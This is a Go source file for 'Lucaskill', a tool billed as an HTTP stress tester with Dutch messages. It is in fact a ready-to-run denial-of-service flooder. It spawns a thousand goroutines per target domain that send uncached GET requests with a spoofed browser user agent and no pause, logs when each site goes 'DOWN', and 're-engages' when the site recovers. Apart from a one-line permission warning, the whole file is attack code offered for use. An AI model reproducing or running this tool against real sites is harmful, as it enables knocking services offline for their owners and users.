package main

import (

	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"runtime"

	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/miekg/dns"
)

const version = "3.2.4"

func printBanner() {
	fmt.Println("Lucaskill is made by Lucas Mangroelal | lucasmangroelal.nl")
}

type options struct {
	domain        string
	attackMinutes int
	outputDir     string
	help          bool
	version       bool
}

type domainStats struct {
	domain          string
	targetURL       string
	totalRequests   int64
	successRequests int64
	failedRequests  int64
	siteDown        bool
	siteDownSince   time.Time
	mu              sync.Mutex
	statusLog       []string
}

func main() {
	var o options

	flag.StringVar(&o.domain, "d", "", "Domein(en) om aan te vallen (comma-separated, bijv. example.com,test.nl)")
	flag.IntVar(&o.attackMinutes, "t", 0, "Aantal minuten om aan te vallen (vereist)")
	flag.StringVar(&o.outputDir, "o", "", "Map om rapport en logs in op te slaan (optioneel)")
	flag.BoolVar(&o.help, "help", false, "Toon help")
	flag.BoolVar(&o.help, "h", false, "Toon help (kort)")
	flag.BoolVar(&o.version, "version", false, "Toon versie")

	flag.Usage = func() {
		printBanner()
		fmt.Fprintf(os.Stderr, "Lucaskill v%s - Advanced HTTP Stress Test Tool\n\n", version)
		fmt.Fprintf(os.Stderr, "Gebruik:\n")
		fmt.Fprintf(os.Stderr, "  lucaskill -d <domein> -t <minuten> [flags]\n\n")
		fmt.Fprintf(os.Stderr, "Voorbeelden:\n")
		fmt.Fprintf(os.Stderr, "  lucaskill -d voorbeeld.nl -t 5\n")
		fmt.Fprintf(os.Stderr, "  lucaskill -d voorbeeld.nl -t 10 -o logs\n")
		fmt.Fprintf(os.Stderr, "  lucaskill -d domein1.nl,domein2.nl -t 5\n\n")
		fmt.Fprintf(os.Stderr, "Flags:\n")
		flag.PrintDefaults()
	}

	flag.Parse()

	if o.version {
		printBanner()
		fmt.Printf("Version: %s\n", version)
		os.Exit(0)
	}
	if o.help {
		flag.Usage()
		os.Exit(0)
	}

	if o.domain == "" || o.attackMinutes <= 0 {
		flag.Usage()
		os.Exit(2)
	}

	printBanner()
	fmt.Printf("Version: %s | Platform: %s/%s\n", version, runtime.GOOS, runtime.GOARCH)
	fmt.Println("⚠️  WAARSCHUWING: Gebruik dit alleen op systemen waar je toestemming voor hebt.")
	fmt.Println()

	domains := strings.Split(o.domain, ",")
	for i := range domains {
		domains[i] = normalizeDomain(domains[i])
	}

	if o.outputDir != "" {
		if err := os.MkdirAll(o.outputDir, 0755); err != nil {
			fmt.Printf("Fout bij maken output map: %v\n", err)
			os.Exit(1)
		}
	}

	runAttack(domains, o.attackMinutes, o.outputDir)
}

func normalizeDomain(d string) string {
	d = strings.TrimSpace(d)
	d = strings.TrimPrefix(d, "http://")
	d = strings.TrimPrefix(d, "https://")
	d = strings.TrimSuffix(d, "/")
	return strings.TrimSuffix(d, ".")
}

func runAttack(domains []string, minutes int, outputDir string) {
	duration := time.Duration(minutes) * time.Minute
	deadline := time.Now().Add(duration)

	// Meer power: meer connections per host en in totaal
	workersPerDomain := 1000 // Was 300
	if len(domains) > 1 {
		workersPerDomain = 500
	}

	// Sterk getunede HTTP client
	httpClient := &http.Client{
		Timeout: 4 * time.Second, // Iets kortere timeout voor snellere turnover
		Transport: &http.Transport{
			MaxIdleConns:        workersPerDomain * len(domains),
			MaxIdleConnsPerHost: workersPerDomain,
			IdleConnTimeout:     90 * time.Second,
			DisableKeepAlives:   false,
			ForceAttemptHTTP2:   true,
		},
	}

	// Setup DNS resolver (8.8.8.8 default)
	dnsClient := &dns.Client{Timeout: 2 * time.Second}
	resolver := "8.8.8.8:53"

	allStats := make([]*domainStats, len(domains))


	// Initial checks
	for i, domain := range domains {
		fmt.Printf("🔍 Initiele check voor %s...\n", domain)

		// DNS lookup
		var targetIPs []string
		m := new(dns.Msg)
		m.SetQuestion(dns.Fqdn(domain), dns.TypeA)
		in, _, err := dnsClient.Exchange(m, resolver)
		if err == nil && len(in.Answer) > 0 {
			for _, ans := range in.Answer {
				if a, ok := ans.(*dns.A); ok {
					targetIPs = append(targetIPs, a.A.String())
				}
			}
		}

		if len(targetIPs) == 0 {
			// Fallback: system lookup
			ips, _ := net.LookupHost(domain)
			if len(ips) > 0 {
				targetIPs = ips
			} else {
				fmt.Printf("⚠️  Geen IP adressen gevonden voor %s, we proberen het toch.\n", domain)
			}
		} else {
			fmt.Printf("📍 IPs: %s\n", strings.Join(targetIPs, ", "))
		}

		// URL bepalen
		urls := []string{"https://" + domain, "http://" + domain}
		var targetURL string
		for _, u := range urls {
			req, _ := http.NewRequest("GET", u, nil)
			req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; Lucaskill/1.0)")
			resp, err := httpClient.Do(req)
			if err == nil {
				targetURL = u
				resp.Body.Close()
				break
			}
		}
		if targetURL == "" {
			targetURL = urls[0] // Fallback
		}

		allStats[i] = &domainStats{
			domain:    domain,
			targetURL: targetURL,
		}
		fmt.Printf("🎯 Target: %s\n", targetURL)
	}

	fmt.Printf("\n🚀 Starten aanval (%d workers per domein)...\n", workersPerDomain)
	fmt.Printf("⏱️  Totale tijd: %d minuten\n", minutes)

	var globalWg sync.WaitGroup

	for _, stats := range allStats {
		if stats == nil {
			continue
		}
		s := stats
		// Voor high-throughput, gebruiken we een semafoor of channel pattern
		// Maar hier simpelweg N go routines die constant vuren
		for w := 0; w < workersPerDomain; w++ {
			globalWg.Add(1)
			go func() {
				defer globalWg.Done()
				
				// Hergebruik buffer voor lezen body (weergave snelheid)
				// buf := make([]byte, 1024) 
				
				for time.Now().Before(deadline) {
					req, _ := http.NewRequest("GET", s.targetURL, nil)
					// Random user agents zou beter zijn, maar keep simple for speed
					req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
					req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
					req.Header.Set("Connection", "keep-alive")

					resp, err := httpClient.Do(req)

					s.mu.Lock()
					isDown := s.siteDown
					s.mu.Unlock()

					if err != nil {
						// Connection error, timeout, etc -> often means site is struggling
						if !isDown {
							s.mu.Lock()
							if !s.siteDown {
								s.siteDown = true
								s.siteDownSince = time.Now()
								msg := fmt.Sprintf("[%s] 💥 %s is DOWN (connection error)!", time.Now().Format(time.TimeOnly), s.domain)
								s.statusLog = append(s.statusLog, msg)
								fmt.Println("\n" + msg)
							}
							s.mu.Unlock()
						}
						atomic.AddInt64(&s.failedRequests, 1)
					} else {
						// Leeg lezen om connectie vrij te maken
						io.Copy(io.Discard, resp.Body)
						resp.Body.Close()

						if resp.StatusCode >= 500 || resp.StatusCode == 429 { // 429 = Too Many Requests
							if !isDown {
								s.mu.Lock()
								if !s.siteDown {
									s.siteDown = true
									s.siteDownSince = time.Now()
									msg := fmt.Sprintf("[%s] 💥 %s is DOWN (status %d)!", time.Now().Format(time.TimeOnly), s.domain, resp.StatusCode)
									s.statusLog = append(s.statusLog, msg)
									fmt.Println("\n" + msg)
								}
								s.mu.Unlock()
							}
							atomic.AddInt64(&s.failedRequests, 1)
						} else {
							// Status < 500 en geen error -> Site is UP
							if isDown {
								s.mu.Lock()
								if s.siteDown {
									downTime := time.Since(s.siteDownSince).Round(time.Second)
									s.siteDown = false
									msg := fmt.Sprintf("[%s] ✅ %s is weer ONLINE (was %v plat). Re-engaging...", time.Now().Format(time.TimeOnly), s.domain, downTime)
									s.statusLog = append(s.statusLog, msg)
									fmt.Println("\n" + msg)
								}
								s.mu.Unlock()
							}
							atomic.AddInt64(&s.successRequests, 1)
						}
					}
					atomic.AddInt64(&s.totalRequests, 1)

					// Geen sleep -> full throttle
				}
			}()
		}
	}

	// Monitor loop
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	// Hier wachten we tot tijd voorbij is OF interrupt
	startTime := time.Now()
loop:
	for {
		select {
		case <-ticker.C:
			remaining := time.Until(deadline).Round(time.Second)
			if remaining <= 0 {
				break loop
			}
			elapsed := time.Since(startTime).Seconds()
			
			var totalReqs int64
			for _, s := range allStats {
				if s != nil {
					totalReqs += atomic.LoadInt64(&s.totalRequests)
				}
			}
			rps := float64(totalReqs) / elapsed

			fmt.Printf("\r⏳ Nog: %v | RPS: %.0f | ", remaining, rps)
			for i, s := range allStats {
				if s == nil { continue }
				if i > 0 { fmt.Print(" | ") }
				
				s.mu.Lock()
				status := "🟢"
				if s.siteDown {
					status = "🔴"
				}
				s.mu.Unlock()
				
				fmt.Printf("%s: %s (%d fail)", s.domain, status, atomic.LoadInt64(&s.failedRequests))
			}
		}
		if time.Now().After(deadline) {
			break
		}
	}

	fmt.Println("\n\n🛑 Tijd is om. Wachten op workers (kan even duren)...")
	// Workers stoppen vanzelf omdat time.Now() > deadline checken
	globalWg.Wait() // Hier niet oneindig wachten in echte wereld, maar voor CLI tool ok-ish

	// Rapport genereren
	generateReport(allStats, outputDir, minutes)
}

func generateReport(stats []*domainStats, outputDir string, minutes int) {
	fmt.Println("\n📊 EINDRESULTATEN")
	
	reportLines := []string{}
	reportLines = append(reportLines, fmt.Sprintf("LUCASKILL RAPPORT - %s", time.Now().Format(time.RFC1123)))
	reportLines = append(reportLines, fmt.Sprintf("Duur test: %d minuten", minutes))
	reportLines = append(reportLines, strings.Repeat("-", 50))

	for _, s := range stats {
		if s == nil { continue }
		
		total := atomic.LoadInt64(&s.totalRequests)
		success := atomic.LoadInt64(&s.successRequests)
		fail := atomic.LoadInt64(&s.failedRequests)
		
		summary := fmt.Sprintf("\nDOMEIN: %s", s.domain)
		fmt.Println(summary)
		reportLines = append(reportLines, summary)

		line1 := fmt.Sprintf("   Requests Totaal: %d", total)
		line2 := fmt.Sprintf("   Geslaagd (Up):   %d", success)
		line3 := fmt.Sprintf("   Gefaald (Down):  %d", fail)
		
		fmt.Println(line1)
		fmt.Println(line2)
		fmt.Println(line3)
		
		reportLines = append(reportLines, line1, line2, line3)
		reportLines = append(reportLines, "   Logboek:")
		
		s.mu.Lock()
		if len(s.statusLog) == 0 {
			msg := "   (Geen downtime events geregistreerd)"
			fmt.Println(msg)
			reportLines = append(reportLines, msg)
		} else {
			for _, log := range s.statusLog {
				fmt.Printf("   %s\n", log)
				reportLines = append(reportLines, "   "+log)
			}
		}
		s.mu.Unlock()
	}

	if outputDir != "" {
		fPath := filepath.Join(outputDir, fmt.Sprintf("report_%d.txt", time.Now().Unix()))
		f, err := os.Create(fPath)
		if err != nil {
			fmt.Printf("\n⚠️  Kon rapport niet opslaan: %v\n", err)
			return
		}
		defer f.Close()
		
		for _, line := range reportLines {
			f.WriteString(line + "\n")
		}
		fmt.Printf("\n💾 Rapport opgeslagen in: %s\n", fPath)
	}
}
